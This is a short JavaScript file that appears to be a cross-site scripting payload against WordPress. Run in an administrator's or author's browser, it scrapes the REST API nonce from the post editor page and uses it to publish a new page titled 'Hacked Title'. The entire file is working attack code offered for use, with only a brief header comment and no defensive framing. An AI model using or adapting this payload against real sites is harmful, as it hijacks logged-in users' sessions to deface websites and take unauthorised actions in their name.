/*
Target: Wordpress - tested on 5.2.2 but probably works on other versions
Action: Create a new page
Context: Must be executed in the context of an administrator/author user
*/

var req = new XMLHttpRequest();

// To get "nonce code"
// That is a "number used once" to help protect URLs and forms from certain types of misuse, malicious or otherwise
req.open("GET", "/wp-admin/post-new.php", false);
req.send();

var regex1 = /var wpApiSettings = (.*)/g;
var regex2 = /"nonce":"([^"]*?)"/g;
var nonce = regex1.exec(req.responseText)[1];
var nonce = regex2.exec(nonce)[1];

// Create page
var url = "/wp-json/wp/v2/pages";
req.open("POST", url, true);
req.setRequestHeader('X-WP-Nonce', nonce)
req.setRequestHeader("Content-Type", "application/json");
req.send("{\"status\":\"publish\",\"title\":\"Hacked Title\",\"content\":\"Hacked Content\"}");
